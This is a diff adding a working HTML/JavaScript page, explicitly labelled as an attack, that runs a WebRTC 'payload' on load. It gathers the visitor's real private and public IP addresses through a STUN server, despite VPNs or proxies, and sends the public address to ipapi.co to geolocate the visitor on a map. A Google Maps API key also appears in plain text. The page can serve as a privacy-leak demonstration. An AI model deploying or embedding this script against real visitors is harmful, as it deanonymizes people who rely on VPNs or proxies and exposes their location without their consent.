@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    	<script type="text/javascript" src="http://maps.googleapis.com/maps/api/js?key=AIzaSyCvGG-L94GklrJhSTq-E-thEPIxFTJnnr8"></script>
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+        <style>
+        	#map {
+        		height: 400px;
+        		width: 50%;
+        	}
+        </style>
+    </head>
+	<h4>IP address:</h4>
+	<ul></ul>
+    <h4>Real Private IP address:</h4>
+    <ul></ul>
+    <h4>Real Public IPv4 address:</h4>
+    <ul></ul>
+    <h4>Real Public IPv6 address:</h4>
+    <ul></ul>
+	<body>
+	    <h4>Location:</h4>
+    	<div id="map"></div>
+		<script>
+			// function to get local IP address
+			function getIP(json) 
+			{
+				var p = document.createElement("p");
+				p.textContent = json.ip;
+				document.getElementsByTagName("ul")[0].appendChild(p);
+			}
+			// function sets map with location of user
+			function setMap(json)
+			{
+				if(!json || !json.latitude || !json.longitude)
+					return;
+				var pos = {lat: json.latitude, lng: json.longitude};
+				var map = new google.maps.Map(document.getElementById('map'), {
+				    zoom: 12,
+				    center: pos
+				});
+				var marker = new google.maps.Marker({
+					position: pos,
+					map: map
+				});
+			}
+		</script>
+		<script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+		<script>
+			/*
+				HERE STARTS THE ATTACK
+			*/
+			// variable for IP duplicates
+			var duplicates = {};
+			// variable to store first real found IP address
+			var ipSet = null;
+			// variable to hold if location has been shown or not
+			var shown = false; 
+			// dummy foo for error callbacks of local description and offer
+			function dummyFoo()
+			{
+			}
+
+			// function to show location of anonym-user
+			function getLocation()
+			{
+				if (!ipSet || !ipSet.ip)
+					return;
+				if (shown)
+					return;
+				shown = true;
+				$.getJSON('https://ipapi.co/' + ipSet.ip + '/json', setMap);
+			}
+			// function writes IP to "ul" tag element
+			function writeIP(ip, isPrivate, isIPv6)
+			{
+				if (duplicates[ip]) {
+					console.log(ip);
+					return;
+				}
+				duplicates[ip] = ip;
+				var p = document.createElement("p");
+				p.textContent = ip;
+				if (isPrivate)
+					document.getElementsByTagName("ul")[1].appendChild(p);
+				else if(!isIPv6)
+					document.getElementsByTagName("ul")[2].appendChild(p);
+				else
+					document.getElementsByTagName("ul")[3].appendChild(p);
+			}
+
+			/*
+			Function to convert IP address to number
+			First we split ip address and get array of each bytes.
+			And then we just add each byte that is converted to int to return value and shift it to left by 8 bits.
+			We returns counted value shifted to right by 0 to force JavaScript to return unsigned int.
+			JavaScript has overloaded operator ">>>" but not "<<<"
+			*/
+			function convertAddressToInt(ip)
+			{
+				if (!ip)
+					return;
+				var splited_ip = ip.split('.');
+				if (!splited_ip || splited_ip.length === 0)
+					return null;
+				var ret_val = 0;
+				for (var i = 0; i < splited_ip.length; i++)
+					ret_val = (ret_val << 8) + parseInt(splited_ip[i]);
+				return ret_val >>> 0;
+			}
+			// function parse IP from received string
+			/*
+				source: https://www.scribd.com/document/2158504/IP-Addressing-Subnetting-Workbook
+				IP subnetting standards:
+				Private address space:
+					10.0.0.0 to 10.255.255.255     == 167772160 to 184549375
+					172.16.0.0 to 172.31.255.255   == 2886729728 to 2887778303
+					192.168.0.0 to 192.168.255.255 == 3232235520 to 3232301055
+				Other addresses are public
+			*/
+			function parseAndWriteIP(ip)
+			{
+				var regex_ipv4 = /\b((25[0-5]|2[0-4]\d|1\d{2}|[1-9]\d|\d)((\.(25[0-5]|2[0-4]\d|1\d{2}|[1-9]\d|\d)){3}))\b/;
+				var tmp_exec = regex_ipv4.exec(ip);
+				var address = null;
+				if (tmp_exec) 
+				{
+					var address_tmp = tmp_exec[1];
+					var converted = convertAddressToInt(address_tmp);
+					if (converted === null)
+						return;
+					if ((converted >= 167772160 && converted <= 184549375) || (converted >= 2886729728 && converted <= 2887778303) || (converted >= 3232235520 && converted <= 3232301055))
+						writeIP(address_tmp, true, false);
+					else
+					{
+						address = address_tmp;
+						writeIP(address_tmp, false, false);
+					}
+				}
+
+				/*
+				Here is described each possibility of regular expression for IPv6
+				First at all regexp tests if match is bounded by start/end of string or whitespaces.
+				For each line with possibility will be written example that it parse 
+				regex_ipv6 = /(
+							(?<=\s|^)(([a-f\d]{1,4}:){7}[a-f\d]{1,4})(?=$|\s)| this line test full length of ipv6 e.g. 1:2:3:4:5:6:7:8
+							((?<=\s|^):(:[a-f\d]{1,4}){1,6})(?=$|\s)| case 1: address starts with :: e.g. ::1 | ::1:2 | ::1:2:3...
+							((?<=\s|^)([a-f\d]{1,4}:){1}(:[a-f\d]{1,4}){1,6})(?=$|\s)| case 2: e.g. 1::2 | 1::2:3...
+							((?<=\s|^)([a-f\d]{1,4}:){1,2}(:[a-f\d]{1,4}){1,5})(?=$|\s)| case 3: e.g. 1:2::3 | 1:2::3:4...
+							((?<=\s|^)([a-f\d]{1,4}:){1,3}(:[a-f\d]{1,4}){1,4})(?=$|\s)| case 4: e.g. 1:2:3::4 | 1:2:3::4:5...
+							((?<=\s|^)([a-f\d]{1,4}:){1,4}(:[a-f\d]{1,4}){1,3})(?=$|\s)| case 5: e.g. 1:2:3:4::5 | 1:2:3:4::5:6...
+							((?<=\s|^)([a-f\d]{1,4}:){1,5}(:[a-f\d]{1,4}){1,2})(?=$|\s)| case 6: e.g. 1:2:3:4:5::6 | 1:2:3:4:5::6:7
+							((?<=\s|^)([a-f\d]{1,4}:){1,6}(:[a-f\d]{1,4}){1})(?=$|\s)| case 7: 1:2:3:4:5:6::7
+							((?<=\s|^)([a-f\d]{1,4}:){1,6}:)(?=$|\s) case 8: 1:: | 1:2::...
+						)/i;
+						also each lines tests shortened versions of address e.g. 1:2:3:: 1:2:3::4 etc.
+				*/
+
+				var regex_ipv6 = /((?<=\s|^)(([a-f\d]{1,4}:){7}[a-f\d]{1,4})(?=$|\s)|((?<=\s|^):(:[a-f\d]{1,4}){1,6})(?=$|\s)|((?<=\s|^)([a-f\d]{1,4}:){1}(:[a-f\d]{1,4}){1,6})(?=$|\s)|((?<=\s|^)([a-f\d]{1,4}:){1,2}(:[a-f\d]{1,4}){1,5})(?=$|\s)|((?<=\s|^)([a-f\d]{1,4}:){1,3}(:[a-f\d]{1,4}){1,4})(?=$|\s)|((?<=\s|^)([a-f\d]{1,4}:){1,4}(:[a-f\d]{1,4}){1,3})(?=$|\s)|((?<=\s|^)([a-f\d]{1,4}:){1,5}(:[a-f\d]{1,4}){1,2})(?=$|\s)|((?<=\s|^)([a-f\d]{1,4}:){1,6}(:[a-f\d]{1,4}){1})(?=$|\s)|((?<=\s|^)([a-f\d]{1,4}:){1,6}:)(?=$|\s))/i;
+				tmp_exec = regex_ipv6.exec(ip);
+				if (tmp_exec)
+				{
+					address = tmp_exec[1];
+					writeIP(address, false, true);
+				}
+				if (!ipSet && address)
+				{
+					ipSet = {'ip': address};
+					getLocation();
+				}
+			}
+			// main function to leak IP
+			function payload() 
+			{
+				try 
+				{
+					// ice server variable - google STUN server is used
+					var is = {iceServers: [{urls: "stun:stun4.l.google.com:19302"}]};
+					// RTC connection class variable - compatible with chrome/chromium and firefox
+					var conn = new window.RTCPeerConnection(is) || 
+							   new window.webRTCPeerConnection(is) || 
+							   new window.mozRTCPeerConnection(is);
+					// if connection wasn't created
+				    if (!conn)
+				    {
+				    	console.log("cannot create connection");
+				    	return;
+				    }
+				    // callback for received data from STUN server
+					conn.onicecandidate = function(ice) {
+						if(ice.candidate)
+							parseAndWriteIP(ice.candidate.candidate);
+					};
+					/*
+						Data channel is initiated with dummy value.
+						STUN server needs to know what will be send via data channel.
+					*/
+					conn.createDataChannel("");
+					/*
+						initiates the creation of an SDP offer for the purpose of starting a new WebRTC connection to a remote peer.
+					*/
+					conn.createOffer(function(result)
+					{
+						/*
+							This description specifies the properties of the local end of the connection, including the media format
+						*/
+	                    conn.setLocalDescription(result, dummyFoo, dummyFoo);
+	                }, dummyFoo);
+	            }
+	            catch(err) 
+	            {
+	            	console.err(err.message);
+	            }
+			}
+			payload();
+		</script>
+	</body>
+</html>
